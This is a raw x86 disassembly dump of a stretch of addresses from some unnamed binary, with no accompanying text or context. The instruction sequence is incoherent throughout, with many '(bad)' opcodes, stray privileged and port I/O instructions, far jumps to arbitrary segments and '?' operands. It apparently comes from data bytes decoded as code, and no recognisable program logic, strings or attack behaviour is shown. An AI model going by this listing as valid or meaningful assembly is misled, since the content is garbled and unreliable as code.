  42a5f7:	add    bh,bl
  42a5f9:	and    eax,0xa50827
  42a5fe:	add    bh,bl
  42a600:	and    eax,0xba98e158
  42a605:	inc    edi
  42a606:	or     BYTE PTR [ebp+0x25ef0000],ch
  42a60c:	add    BYTE PTR [edx+0x0],bh
  42a60f:	add    al,al
  42a611:	jo     0x42a613
  42a613:	add    BYTE PTR [ebp-0x4ef5c35e],ah
  42a619:	pop    ebx
  42a61a:	or     ecx,DWORD PTR ds:0x7886782a
  42a620:	and    BYTE PTR [eax+eax*1-0x3fffff8d],dl
  42a627:	inc    ebx
  42a628:	add    BYTE PTR [eax],al
  42a62a:	cmp    DWORD PTR [ebp+eiz*8+0x67],ebx
  42a62e:	dec    eax
  42a62f:	push   edx
  42a630:	add    BYTE PTR [eax],al
  42a632:	data16 aaa 
  42a634:	(bad)  
  42a635:	aad    0xed
  42a637:	pop    es
  42a638:	mov    al,0x51
  42a63a:	ss inc ebx
  42a63c:	adc    al,BYTE PTR [edx-0x316ad55c]
  42a642:	fcmovne st,st(7)
  42a644:	sbb    al,0xe6
  42a646:	into   
  42a647:	mov    eax,0x9b8e4bbb
  42a64c:	inc    esi
  42a64d:	pop    edx
  42a64e:	push   ecx
  42a64f:	inc    eax
  42a650:	jae    0x42a652
  42a652:	add    BYTE PTR [ebp-0x244e39f5],al
  42a658:	shr    al,0x0
  42a65b:	add    BYTE PTR [edx+0x1e13cbf],bh
  42a661:	outs   dx,BYTE PTR ds:[esi]
  42a662:	pushf  
  42a663:	movups XMMWORD PTR [edi+edi*4-0x40100df5],xmm3
  42a66b:	add    BYTE PTR [edx],dh
  42a66d:	add    BYTE PTR [eax],al
  42a66f:	retf   
  42a670:	pop    eax
  42a671:	pop    es
  42a672:	ret    
  42a673:	sub    BYTE PTR [ebx-0x57],bl
  42a676:	cmc    
  42a677:	sub    BYTE PTR [ebp-0x395072db],al
  42a67d:	mov    bh,0x1b
  42a67f:	and    BYTE PTR [ecx+0x5e],bh
  42a682:	sbb    al,0x37
  42a684:	inc    edi
  42a685:	and    BYTE PTR [esp+ebx*2],cl
  42a688:	add    BYTE PTR [eax],al
  42a68a:	test   eax,0xf980
  42a68f:	push   cs
  42a690:	hlt    
  42a691:	test   eax,0x869a93a
  42a696:	add    al,0x0
  42a698:	add    BYTE PTR [edi-0x48],dh
  42a69b:	xor    esp,DWORD PTR [ebp+0x111a0e01]
  42a6a1:	aaa    
  42a6a2:	loop   0x42a681
  42a6a4:	cmc    
  42a6a5:	ss mov edi,0xbf3373cb
  42a6ab:	(bad)  
  42a6ac:	pop    ebx
  42a6ad:	fs mov ebx,0xae57220a
  42a6b3:	xchg   esi,eax
  42a6b4:	into   
  42a6b5:	jns    0x42a6c5
  42a6b7:	or     al,al
  42a6b9:	rol    BYTE PTR [eax],1
  42a6bb:	add    BYTE PTR [edi],dh
  42a6bd:	mov    ch,0x4e
  42a6bf:	mov    esi,?
  42a6c1:	add    BYTE PTR [eax],al
  42a6c3:	gs mov ah,0x5a
  42a6c6:	outs   dx,BYTE PTR ds:[esi]
  42a6c7:	jns    0x42a6de
  42a6c9:	hlt    
  42a6ca:	fdivr  DWORD PTR [edi-0x5b]
  42a6cd:	repnz fisub DWORD PTR [edx-0x27]
  42a6d1:	mov    bh,bl
  42a6d3:	add    BYTE PTR [eax],al
  42a6d5:	fimul  DWORD PTR [eax]
  42a6d7:	fwait
  42a6d8:	add    BYTE PTR [eax],al
  42a6da:	je     0x42a73d
  42a6dc:	cmp    ebp,DWORD PTR [edx]
  42a6de:	test   BYTE PTR [ebx],dl
  42a6e0:	add    BYTE PTR [eax],al
  42a6e2:	xchg   edi,eax
  42a6e3:	fmul   QWORD PTR [eax-0x17]
  42a6e6:	add    BYTE PTR [eax],al
  42a6e8:	das    
  42a6e9:	mov    DWORD PTR [edi+0x40],0xc30000ca
  42a6f0:	das    
  42a6f1:	mov    WORD PTR [ecx],ss
  42a6f3:	add    BYTE PTR [eax],al
  42a6f5:	fild   QWORD PTR cs:[eax-0x539b471b]
  42a6fc:	(bad)  
  42a6fd:	and    eax,DWORD PTR [ebx-0x48bfead7]
  42a703:	add    BYTE PTR [eax],al
  42a705:	imul   esp,ebp,0xa1a26edf
  42a70b:	jmp    0x7b0c:0xc388
  42a712:	add    BYTE PTR [eax],al
  42a714:	(bad)
  42a717:	and    DWORD PTR [eax],esp
  42a719:	mov    ds:0x39a793a5,al
  42a71e:	imul   eax,DWORD PTR [edi+edx*2-0x5a140000],0xffffff8c
  42a726:	mov    al,0x0
  42a728:	add    BYTE PTR [esi+0x25d011c2],bh
  42a72e:	cli    
  42a72f:	(bad)  
  42a731:	ret    0x76c8
  42a734:	add    BYTE PTR [eax],al
  42a736:	cmp    esi,DWORD PTR [ecx+ebp*1-0x1b]
  42a73a:	push   es
  42a73b:	push   ebp
  42a73c:	pushf  
  42a73d:	(bad)  
  42a73f:	pushf  
  42a740:	(bad)  
  42a741:	sbb    BYTE PTR [edi+0x544c],bl
  42a747:	xchg   ebp,eax
  42a748:	add    BYTE PTR ds:0x6c3b0000,ah
  42a74e:	sbb    BYTE PTR cs:[edi-0x2dff49a4],ah
  42a755:	add    BYTE PTR [eax],al
  42a757:	cmp    al,0xb1
  42a759:	or     BYTE PTR [edx],dh
  42a75b:	add    BYTE PTR [eax],al
  42a75d:	stos   DWORD PTR es:[edi],eax
  42a75e:	idiv   DWORD PTR [edi]
  42a760:	shl    DWORD PTR [ebp+0x66],0x67
  42a764:	loope  0x42a771
  42a766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a767:	pusha  
  42a768:	sbb    al,0xd8
  42a76a:	fisttp DWORD PTR [ebp+eiz*1-0x70ba0000]
  42a771:	scas   eax,DWORD PTR es:[edi]
  42a772:	jg     0x42a723
  42a774:	arpl   WORD PTR [ebx],sp
  42a776:	sub    al,0x12
  42a778:	add    DWORD PTR [eax],ebp
  42a77a:	popf   
  42a77b:	jo     0x42a7a5
  42a77d:	cld    
  42a77e:	mov    WORD PTR [eax+0x0],?
  42a781:	add    BYTE PTR [ecx+0x6b18ac59],ch
  42a787:	xor    ecx,edi
  42a789:	fwait
  42a78a:	sar    BYTE PTR [esi+0x11570000],0x40
  42a791:	jg     0x42a793
  42a793:	add    BYTE PTR [ebx],bl
  42a795:	or     eax,0xd71a7bc5
  42a79a:	ret    0x75b0
  42a79d:	pop    ecx
  42a79e:	inc    esi
  42a79f:	fwait
  42a7a0:	sar    BYTE PTR [ebx],0x0
  42a7a3:	add    BYTE PTR [ebx-0x6e],bh
  42a7a6:	xchg   ebp,eax
  42a7a7:	adc    DWORD PTR [ebx-0x32],esi
  42a7aa:	jbe    0x42a7c3
  42a7ac:	rcr    eax,0x40
  42a7af:	dec    esi
  42a7b0:	add    BYTE PTR [eax],al
  42a7b2:	and    BYTE PTR [edx],cl
  42a7b4:	frstor [edx+edx*1]
  42a7b7:	xor    esp,ebx
  42a7b9:	jne    0x42a7b8
  42a7bb:	adc    DWORD PTR [ecx],edx
  42a7bd:	pop    ecx
  42a7be:	retf   0x700e
  42a7c1:	ins    BYTE PTR es:[edi],dx
  42a7c2:	loope  0x42a7ce
  42a7c4:	iret   
  42a7c5:	and    BYTE PTR [ecx],bl
  42a7c7:	xchg   esi,ecx
  42a7c9:	lods   ax,WORD PTR ds:[esi]
  42a7cb:	cmp    ebx,eax
  42a7cd:	rol    DWORD PTR ds:0xf53fe01e,1
  42a7d3:	jge    0x42a79f
  42a7d5:	push   0x15
  42a7d7:	push   eax
  42a7d8:	xor    DWORD PTR [ebp-0x6a],edx
  42a7db:	stc    
  42a7dc:	leave  
  42a7dd:	arpl   WORD PTR [ecx],si
  42a7df:	mov    bl,0xab
  42a7e1:	or     BYTE PTR [edi],0x0
  42a7e4:	add    bh,cl
  42a7e6:	in     eax,0xdc
  42a7e8:	push   0x25
  42a7ea:	cli    
  42a7eb:	aam    0x63
  42a7ed:	test   BYTE PTR [ebp+0x79af0000],bl
  42a7f3:	imul   edx,DWORD PTR ds:0x6994ab09,0xffffffae
  42a7fa:	int3   
  42a7fb:	stos   BYTE PTR es:[edi],al
  42a7fc:	add    BYTE PTR [eax],al
  42a7fe:	jne    0x42a825
  42a800:	rcl    DWORD PTR [eax],1
  42a802:	push   ebx
  42a803:	or     bl,BYTE PTR [ebx]
  42a805:	mov    cl,0x84
  42a807:	mov    eax,ds:0x11aa0000
  42a80c:	(bad)  
  42a80e:	or     edi,DWORD PTR [edx+0x2568e4b1]
  42a814:	cmp    esi,DWORD PTR [edx+0x10]
  42a817:	mov    dl,0xd9
  42a819:	iret   
  42a81a:	pushf  
  42a81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81c:	(bad)  
  42a81d:	lds    eax,FWORD PTR [eax]
  42a81f:	add    BYTE PTR [eax+eiz*1+0x0],al
  42a823:	add    BYTE PTR ds:0x7d24ffd4,dl
  42a829:	sbb    cl,0x0
  42a82c:	add    cl,al
  42a82e:	inc    eax
  42a82f:	mov    al,ds:0x66140000
  42a834:	(bad)  
  42a835:	icebp  
  42a836:	add    BYTE PTR [eax],al
  42a838:	int3   
  42a839:	mov    BYTE PTR [eax],0x0
  42a83c:	ins    DWORD PTR es:[edi],dx
  42a83d:	xchg   edi,eax
  42a83e:	xchg   edx,eax
  42a83f:	pushf  
  42a840:	in     eax,0x3a
  42a842:	ret    0x60b5
  42a845:	sbb    ecx,eax
  42a847:	inc    eax
  42a848:	dec    edi
  42a849:	add    BYTE PTR [eax],al
  42a84b:	push   cs
  42a84c:	clc    
  42a84d:	rcr    DWORD PTR [esi+0x75],0xa3
  42a851:	pop    ss
  42a852:	push   edx
  42a853:	adc    DWORD PTR [esi],0x1037258f
  42a859:	lds    edx,FWORD PTR [edi+0x7bdcd20f]
  42a85f:	cmp    BYTE PTR [ecx],ch
  42a861:	adc    DWORD PTR [edx],eax
  42a863:	adc    edi,edx
  42a865:	mov    al,0xc1
  42a867:	jne    0x42a8cf
  42a869:	fnstsw WORD PTR [esi+0x76dc19b3]
  42a86f:	rcl    DWORD PTR [ebx+0x14ddace2],cl
  42a875:	pop    ebx
  42a876:	outs   dx,DWORD PTR ds:[esi]
  42a877:	and    eax,0x340c60
  42a87c:	add    BYTE PTR [ebx+0x14],dh
  42a87f:	mov    al,ds:0xa2cc
  42a884:	lods   al,BYTE PTR ds:[esi]
  42a885:	or     BYTE PTR [ebx+0x88b0000],bl
  42a88b:	mov    esp,0x25770000
  42a890:	mov    ecx,0xb20006
  42a895:	add    BYTE PTR [esi],cl
  42a897:	shl    DWORD PTR [edx],cl
  42a899:	aas    
  42a89a:	adc    edx,DWORD PTR [edx-0x58ce4841]
  42a8a0:	xchg   edx,eax
  42a8a1:	mov    esp,0x64f98d32
  42a8a6:	or     BYTE PTR [esi],0x0
  42a8a9:	add    BYTE PTR [eax+0x691a1ed9],ah
  42a8af:	nop
  42a8b0:	jge    0x42a8c5
  42a8b2:	xchg   DWORD PTR [ebx+esi*1],edx
  42a8b5:	push   ds
  42a8b6:	std    
  42a8b7:	jecxz  0x42a91e
  42a8b9:	and    eax,0x1657d4a7
  42a8be:	int    0xc2
  42a8c0:	jns    0x42a93d
  42a8c2:	int    0xc7
  42a8c4:	adc    eax,eax
  42a8c6:	dec    edi
  42a8c7:	add    BYTE PTR [eax],al
  42a8c9:	pop    esi
  42a8ca:	cdq    
  42a8cb:	and    al,0x13
  42a8cd:	ret    0xebd7
  42a8d0:	pop    ss
  42a8d1:	push   eax
  42a8d2:	int3   
  42a8d3:	dec    ebx
  42a8d4:	add    BYTE PTR [eax],al
  42a8d6:	jns    0x42a956
  42a8d8:	mov    edi,0xdcc0
  42a8dd:	ja     0x42a8e5
  42a8df:	popa   
  42a8e0:	outs   dx,BYTE PTR ds:[esi]
  42a8e1:	sub    BYTE PTR [edi],bl
  42a8e3:	repnz jecxz 0x42a930
  42a8e6:	and    esi,ebp
  42a8e8:	jecxz  0x42a8e5
  42a8ea:	adc    al,0x82
  42a8ec:	test   BYTE PTR [esi+0x27c1de16],0x43
  42a8f3:	push   edx
  42a8f4:	push   cs
  42a8f5:	push   ebp
  42a8f6:	jne    0x42a8d7
  42a8f8:	add    BYTE PTR [edx],0x41
  42a8fb:	fs fwait
  42a8fd:	inc    esp
  42a8fe:	add    al,0x0
  42a900:	add    BYTE PTR [ecx],cl
  42a902:	lahf   
  42a903:	fsubr  DWORD PTR [eax+0x2c]
  42a906:	icebp  
  42a907:	ins    DWORD PTR es:[edi],dx
  42a908:	shl    DWORD PTR [edx-0x31],1
  42a90b:	(bad)  
  42a90c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a90d:	fst    DWORD PTR ss:[ecx+0x40]
  42a911:	(bad)  
  42a912:	add    BYTE PTR [eax],al
  42a914:	sub    ch,BYTE PTR [edi]
  42a916:	(bad)  
  42a917:	outs   dx,BYTE PTR ds:[esi]
  42a918:	sub    DWORD PTR [esi-0x56e9b6ce],ecx
  42a91e:	lds    ebx,FWORD PTR [edx]
  42a920:	adc    al,0x67
  42a922:	fnstenv [ebx+0x63]
  42a925:	ins    DWORD PTR es:[edi],dx
  42a926:	retf   
  42a927:	icebp  
  42a928:	gs in  eax,dx
  42a92a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a92b:	push   ecx
  42a92c:	aas    
  42a92d:	mov    ds:0xd5253f51,al
  42a932:	fisttp DWORD PTR [esi+0x29]
  42a935:	popa   
  42a936:	push   ecx
  42a937:	or     DWORD PTR [edi-0x7a],esp
  42a93a:	jno    0x42a8e4
  42a93c:	pop    edx
  42a93d:	mov    ah,0xd
  42a93f:	push   ebp
  42a940:	adc    al,0x2f
  42a942:	mov    edx,0xde981233
  42a947:	jae    0x42a9c7
  42a949:	in     eax,0xa5
  42a94b:	xor    DWORD PTR [ecx],esi
  42a94d:	fcmovu st,st(4)
  42a94f:	adc    ebp,DWORD PTR fs:[ecx+eax*8+0x26c00142]
  42a957:	add    BYTE PTR [eax],al
  42a959:	xchg   ebx,eax
  42a95a:	das    
  42a95b:	push   es
  42a95c:	xchg   ebx,eax
  42a95d:	ret    0x1e40
  42a960:	add    BYTE PTR [eax],al
  42a962:	adc    BYTE PTR [ecx-0x24140000],0xf0
  42a969:	pop    edx
  42a96a:	scas   al,BYTE PTR es:[edi]
  42a96b:	les    eax,FWORD PTR [ecx+0x0]
  42a96e:	add    BYTE PTR ds:0x9dc3f972,cl
  42a974:	lds    ebp,FWORD PTR [ebp+0x4840d7]
  42a97a:	add    BYTE PTR [edi],cl
  42a97c:	adc    eax,0x331f12c1
  42a981:	int    0x96
  42a983:	jne    0x42aa02
  42a985:	push   eax
  42a986:	xchg   edx,eax
  42a987:	pop    ss
  42a988:	inc    ebx
  42a989:	fistp  WORD PTR [esp+ebx*1+0x8]
  42a98d:	push   es
  42a98e:	add    BYTE PTR [eax],al
  42a990:	clc    
  42a991:	pop    ebp
  42a992:	push   ds
  42a993:	push   cs
  42a994:	xor    BYTE PTR [eax+0x6d],bl
  42a997:	cdq    
  42a998:	push   edi
  42a999:	ins    BYTE PTR es:[edi],dx
  42a99a:	pop    ebp
  42a99b:	and    esi,DWORD PTR [ebx-0x5b]
  42a99e:	outs   dx,DWORD PTR ds:[esi]
  42a99f:	scas   eax,DWORD PTR es:[edi]
  42a9a0:	retf   0x1003
  42a9a3:	fwait
  42a9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9a5:	inc    eax
  42a9a6:	lock add BYTE PTR [eax],al
  42a9a9:	and    al,0x30
  42a9ab:	lds    edi,FWORD PTR [eax+0x72]
  42a9ae:	mov    al,dl
  42a9b0:	data16 adc dh,BYTE PTR [esi+ebx*4]
  42a9b4:	lods   eax,DWORD PTR ds:[esi]
  42a9b5:	adc    al,0xd5
  42a9b7:	ret    0xa5a
  42a9ba:	push   edi
  42a9bb:	cmp    DWORD PTR [eax+0x3d],edi
  42a9be:	fadd   QWORD PTR fs:[eax+0x60000db]
  42a9c5:	push   edx
  42a9c6:	int3   
  42a9c7:	mov    al,BYTE PTR [eax]
  42a9c9:	add    BYTE PTR [ebx+0x7b],dl
  42a9cc:	inc    ebx
  42a9cd:	fwait
  42a9ce:	mov    edx,0x1709972
  42a9d3:	add    BYTE PTR [ebx],0x0
  42a9d6:	add    BYTE PTR [esp+ebx*8-0x6e],ah
  42a9da:	sbb    DWORD PTR [ebp-0x73ef025a],ebx
  42a9e0:	mov    bh,0x0
  42a9e2:	add    BYTE PTR [ecx],dh
  42a9e4:	cmp    BYTE PTR [esi+0x6e],dh
  42a9e7:	adc    esi,DWORD PTR [ebx+0x1b]
  42a9ea:	jbe    0x42a9ac
  42a9ec:	xchg   DWORD PTR [eax],eax
  42a9ee:	add    BYTE PTR [ebx],cl
  42a9f0:	jno    0x42a990
  42a9f2:	ret    
  42a9f3:	cmp    ecx,DWORD PTR [edx]
  42a9f5:	je     0x42aa16
  42a9f7:	sbb    eax,0xb5529e1b
  42a9fc:	pop    ss
  42a9fd:	jno    0x42a9dc
  42a9ff:	mov    esi,0x77c3eb42
  42aa04:	jo     0x42a98b
  42aa06:	push   0xd581c3e9
  42aa0b:	sub    BYTE PTR [edx],dl
  42aa0d:	or     eax,0xe8c4
  42aa12:	inc    eax
  42aa13:	popa   
  42aa14:	add    BYTE PTR [eax],al
  42aa16:	cmp    bl,bl
  42aa18:	ret    
  42aa19:	jl     0x42aa21
  42aa1b:	icebp  
  42aa1c:	ror    DWORD PTR [edi],0x7c
  42aa1f:	out    dx,al
  42aa20:	adc    eax,DWORD PTR ds:0x99dc2317
  42aa26:	push   ss
  42aa27:	push   eax
  42aa28:	retf   0x6dcd
  42aa2b:	test   BYTE PTR [edi],bh
  42aa2d:	add    BYTE PTR [eax],al
  42aa2f:	repz add ax,WORD PTR [edx-0x6c]
  42aa34:	ins    BYTE PTR es:[edi],dx
  42aa35:	pop    ss
  42aa36:	ror    esp,1
  42aa38:	pop    ecx
  42aa39:	add    BYTE PTR [eax],al
  42aa3b:	add    eax,0x7cb3e416
  42aa40:	xor    eax,0x7ac5c633
  42aa45:	imul   eax,esi,0xd27c0754
  42aa4b:	(bad)  
  42aa4c:	sub    DWORD PTR ds:[ecx+0x138c],edx
  42aa53:	sbb    edi,DWORD PTR [edx]
  42aa55:	into   
  42aa56:	sbb    ah,BYTE PTR es:[ecx+0x73]
  42aa5a:	jne    0x42a9dc
  42aa5c:	test   BYTE PTR [eax],al
  42aa5e:	add    BYTE PTR [ebx-0x1d],cl
  42aa61:	sub    BYTE PTR [edx+0x63],0xc6
  42aa65:	and    ecx,DWORD PTR [ebx+edx*2]
  42aa68:	add    BYTE PTR [eax],al
  42aa6a:	das    
  42aa6b:	adc    BYTE PTR [eax+0x15000072],al
  42aa71:	mov    ebx,0x79132ede
  42aa76:	ret    0x784e
  42aa79:	arpl   bx,bx
  42aa7b:	sbb    eax,0x5713df0b
  42aa80:	sbb    bl,BYTE PTR [edx-0x38]
  42aa83:	cmp    al,0x0
  42aa85:	add    BYTE PTR [eax+0x6],ah
  42aa88:	pushf  
  42aa89:	(bad)  
  42aa8a:	push   edi
  42aa8b:	sbb    BYTE PTR [edi-0x4744a51e],bl
  42aa91:	retf   0x75b9
  42aa94:	dec    edx
  42aa95:	xchg   esi,eax
  42aa96:	push   edx
  42aa97:	pop    es
  42aa98:	or     ebx,esp
  42aa9a:	inc    eax
  42aa9b:	arpl   WORD PTR [eax],ax
  42aa9d:	add    BYTE PTR ds:0xba61c209,bl
  42aaa3:	pop    es
  42aaa4:	loope  0x42aa62
  42aaa6:	jbe    0x42aa5d
  42aaa8:	jne    0x42aa3f
  42aaaa:	pop    es
  42aaab:	jnp    0x42aa99
  42aaad:	inc    eax
  42aaae:	sbb    eax,0x74070000
  42aab3:	call   0xda342833
  42aab8:	cdq    
  42aab9:	mov    ds:0x73c2c6d8,eax
  42aabe:	xchg   esp,eax
  42aabf:	jae    0x42aaaa
  42aac1:	or     ebx,DWORD PTR [edi+0x37127bd0]
  42aac7:	out    0x58,eax
  42aac9:	es je  0x42aa5b
  42aacc:	and    bl,BYTE PTR [edi]
  42aace:	sub    ecx,ecx
  42aad0:	outs   dx,BYTE PTR ds:[esi]
  42aad1:	or     DWORD PTR [ebx+ecx*8+0x77],esi
  42aad5:	adc    DWORD PTR [ecx-0x37],ebx
  42aad8:	enter  0x20,0x0
  42aadc:	je     0x42aa78
  42aade:	lods   eax,DWORD PTR ds:[esi]
  42aadf:	adc    DWORD PTR cs:[esi],edi
  42aae2:	jae    0x42aaa9
  42aae4:	jns    0x42aaca
  42aae6:	fiadd  WORD PTR [ebx]
  42aae8:	or     DWORD PTR [ecx-0x54],esp
  42aaeb:	sbb    BYTE PTR [esi],0x0
  42aaee:	add    BYTE PTR [eax-0x7bffffb8],al
  42aaf4:	dec    esp
  42aaf5:	add    BYTE PTR [eax],al
  42aaf7:	fisubr DWORD PTR [edi+0x14]
  42aafa:	xor    al,0xe9
  42aafc:	mov    BYTE PTR ds:0x4d040000,dh
  42ab02:	add    BYTE PTR [eax],al
  42ab04:	pop    ecx
  42ab05:	ret    0x1c21
  42ab08:	add    esi,DWORD PTR [eax]
  42ab0a:	pop    esp
  42ab0b:	push   cs
  42ab0c:	sub    BYTE PTR [eax-0x5a768e06],dh
  42ab12:	sahf   
  42ab13:	add    dh,0x0
  42ab16:	add    BYTE PTR [ecx],dh
  42ab18:	fldenv [edi]
  42ab1a:	sbb    cl,dh
  42ab1c:	xor    al,0xed
  42ab1e:	push   es
  42ab1f:	jae    0x42aad3
  42ab21:	das    
  42ab22:	je     0x42aba0
  42ab24:	sar    DWORD PTR [edi+0x5],0x10
  42ab28:	adc    BYTE PTR [edx],al
  42ab2a:	es inc edx
  42ab2c:	ja     0x42ab0a
  42ab2e:	ds xchg ebp,eax
  42ab30:	dec    esp
  42ab31:	mov    al,BYTE PTR [eax]
  42ab33:	add    BYTE PTR [ebx+edx*1],ah
  42ab36:	jg     0x42ab35
  42ab38:	dec    edx
  42ab39:	push   ds
  42ab3a:	ror    dl,1
  42ab3c:	stos   DWORD PTR es:[edi],eax
  42ab3d:	jns    0x42ab4a
  42ab3f:	(bad)  
  42ab40:	mov    al,0x1d
  42ab42:	enter  0xa7,0x0
  42ab46:	fxch   st(5)
  42ab48:	and    eax,0x3ebc7370
  42ab4d:	xchg   ebx,eax
  42ab4e:	jb     0x42abcc
  42ab50:	jge    0xae601636
  42ab56:	retf   0x7495
  42ab59:	(bad)  
  42ab5b:	xchg   edi,eax
  42ab5c:	adc    ecx,esp
  42ab5e:	fdivr  QWORD PTR [ecx]
  42ab60:	jb     0x42ab78
  42ab62:	rcl    DWORD PTR [eax+0xbd8c06],0x0
  42ab69:	shl    DWORD PTR [ecx+0x79e90905],cl
  42ab6f:	cmp    dl,0x0
  42ab72:	add    BYTE PTR [edi+0x16272ee3],bh
  42ab78:	(bad)  
  42ab79:	retf   0x316
  42ab7c:	push   ss
  42ab7d:	mov    dl,0xfe
  42ab7f:	test   BYTE PTR [eax+eax*1],bl
  42ab82:	add    ch,cl
  42ab84:	addr16 jbe 0x42abf6
  42ab87:	ror    BYTE PTR [esi],1
  42ab89:	pop    ss
  42ab8a:	ins    DWORD PTR es:[edi],dx
  42ab8b:	fist   WORD PTR [edi+0x1c]
  42ab8e:	loop   0x42aba3
  42ab90:	jns    0x42ab98
  42ab92:	sbb    ebp,ecx
  42ab94:	push   edi
  42ab95:	pop    ss
  42ab96:	sbb    al,0xc8
  42ab98:	push   0x72590000
  42ab9d:	(bad)  
  42ab9e:	iret   
  42ab9f:	aas    
  42aba0:	add    eax,0x3b75acf7
  42aba5:	cmp    cl,ch
  42aba7:	push   0xffffff83
  42aba9:	cmp    eax,0xe61b29c9
  42abae:	jae    0x42abdb
  42abb0:	sbb    dl,BYTE PTR [edi-0x3f]
  42abb3:	add    DWORD PTR [edx+0x59],esi
  42abb6:	iret   
  42abb7:	mov    esi,0x9508
  42abbc:	jmp    0x3607dae
  42abc1:	out    dx,eax
  42abc2:	outs   dx,BYTE PTR ds:[esi]
  42abc3:	push   ss
  42abc4:	idiv   bh
  42abc6:	sub    DWORD PTR [edx+0x73d3fed6],eax
  42abcc:	jnp    0x42ac05
  42abce:	adc    eax,0x504
  42abd3:	int3   
  42abd4:	fiadd  DWORD PTR [eax]
  42abd6:	add    dl,dl
  42abd8:	inc    esp
  42abd9:	xchg   DWORD PTR [eax],eax
  42abdb:	add    BYTE PTR [ecx],cl
  42abdd:	out    0xdd,eax
  42abdf:	sub    BYTE PTR [edx-0x1fa307a5],al
  42abe5:	test   al,0xc3
  42abe7:	fs pop ds
  42abe9:	cmp    cl,bh
  42abeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abec:	jo     0x42ab9a
  42abee:	fistp  DWORD PTR [ebx-0x6650e93d]
  42abf4:	xor    cl,ah
  42abf6:	int3   
  42abf7:	xor    eax,0x18cd0000
  42abfc:	loopne 0x42abc1
  42abfe:	pop    ecx
  42abff:	sbb    DWORD PTR [esi-0x58e7dc21],eax
  42ac05:	jae    0x42abc9
  42ac07:	jbe    0x42ac81
  42ac09:	aam    0xad
  42ac0b:	sbb    esi,DWORD PTR [ecx-0x24]
  42ac0e:	test   al,cl
  42ac10:	add    BYTE PTR [eax],al
  42ac12:	arpl   WORD PTR [ebx-0x31],di
  42ac15:	fs xor al,0x50
  42ac18:	fiadd  WORD PTR [eax+0x19000052]
  42ac1e:	int3   
  42ac1f:	mov    BYTE PTR [eax],al
  42ac21:	add    dh,bl
  42ac23:	fnstenv [esi-0x29]
  42ac26:	sub    DWORD PTR [edi],esi
  42ac28:	pop    ss
  42ac29:	clc    
  42ac2a:	adc    BYTE PTR [ebp+eiz*2-0x1],ch
  42ac2e:	push   ebx
  42ac2f:	push   edi
  42ac30:	and    DWORD PTR [ecx],ecx
  42ac32:	enter  0x84,0x0
  42ac36:	pop    ecx
  42ac37:	jb     0x42abef
  42ac39:	enter  0xe2,0x0
  42ac3d:	leave  
  42ac3e:	or     eax,0x92f566a
  42ac43:	cmp    eax,0x31f31e8
  42ac48:	fistp  QWORD PTR [eax+ebx*1+0x216eca3c]
  42ac4f:	ds (bad) 
  42ac51:	jne    0x42abe1
  42ac53:	add    BYTE PTR [edi],dh
  42ac55:	add    BYTE PTR [eax],al
  42ac57:	(bad)  
  42ac58:	adc    DWORD PTR [ebx+ebp*4],ebx
  42ac5b:	cld    
  42ac5c:	jns    0x42acd7
  42ac5e:	call   0xfb482b3d
  42ac63:	in     al,dx
  42ac64:	das    
  42ac65:	or     DWORD PTR ds:0x5b1831e8,esi
  42ac6b:	rcr    DWORD PTR [ecx+ebx*1+0x3595ce74],0x36
  42ac73:	(bad)  
  42ac74:	mov    bl,0x9
  42ac76:	xor    ebx,edi
  42ac78:	inc    esp
  42ac79:	inc    DWORD PTR [eax]
  42ac7b:	add    BYTE PTR [eax+0x3000007f],al
  42ac81:	out    0x85,al
  42ac83:	ja     0x42ac18
  42ac85:	scas   al,BYTE PTR es:[edi]
  42ac86:	xchg   ecx,eax
  42ac87:	cmp    ebp,DWORD PTR [ebx+eax*8-0x1e7aee4b]
  42ac8e:	mov    fs,WORD PTR [esi]
  42ac90:	push   0xf20776c2
  42ac95:	call   0xe041cc31
  42ac9a:	mov    cl,0xf
  42ac9c:	xchg   DWORD PTR [esi+0x71],edx
  42ac9f:	pop    ebx
  42aca0:	jns    0x42ac7f
  42aca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aca3:	jge    0x42ac80
  42aca5:	fiadd  WORD PTR [edx+0x1a]
  42aca8:	push   edx
  42aca9:	(bad)  [edi-0x72]
  42acac:	fisttp QWORD PTR [esi+eiz*8]
  42acaf:	add    BYTE PTR [eax],al
  42acb1:	mov    ch,BYTE PTR [ecx-0x12]
  42acb4:	retf   
  42acb5:	stos   DWORD PTR es:[edi],eax
  42acb6:	ins    BYTE PTR es:[edi],dx
  42acb7:	sbb    edx,eax
  42acb9:	pop    ecx
  42acba:	xor    al,0x7
  42acbc:	(bad)  
  42acbd:	push   0x3f
  42acbf:	les    ecx,FWORD PTR [edi]
  42acc1:	add    BYTE PTR [eax],al
  42acc3:	adc    DWORD PTR [ebx+0x14],0x72b553f9
  42acca:	imul   ebp
  42accc:	test   BYTE PTR [ebx+0x0],dh
  42accf:	add    BYTE PTR [ebx],cl
  42acd1:	add    esp,edx
  42acd3:	cs adc ecx,edi
  42acd6:	adc    BYTE PTR [esi+0x7a],cl
  42acd9:	jecxz  0x42acb4
  42acdb:	fs data16 and al,0x91
  42acdf:	inc    ebx
  42ace0:	xor    bl,ah
  42ace2:	ss adc DWORD PTR cs:[ecx],ebx
  42ace6:	(bad)  
  42ace7:	inc    BYTE PTR [eax]
  42ace9:	add    BYTE PTR [eax+0xaefe872],ch
  42acef:	adc    esp,ebx
  42acf1:	fst    DWORD PTR [edi+0x17]
  42acf4:	(bad)  
  42acf5:	jmp    0x1c71:0xe148
  42acfc:	shl    BYTE PTR [edx+0x1c0cb206],1
  42ad02:	add    BYTE PTR [eax],al
  42ad04:	fs sub eax,0x71c896
  42ad0a:	add    BYTE PTR [ecx-0x3e3e4fea],bl
  42ad10:	jne    0x42ad30
  42ad12:	fmul   QWORD PTR [ecx-0x62]
  42ad15:	jo     0x42acad
  42ad17:	cmp    edi,DWORD PTR [edx+eiz*4+0x31]
  42ad1b:	imul   ecx,DWORD PTR [edi],0x4
  42ad1e:	enter  0x0,0x6c
  42ad22:	xchg   ebp,eax
  42ad23:	sbb    DWORD PTR [eax],edx
  42ad25:	fmul   QWORD PTR [ebx+0x17]
  42ad28:	mov    cs,WORD PTR [edi]
  42ad2a:	jb     0x42ad9a
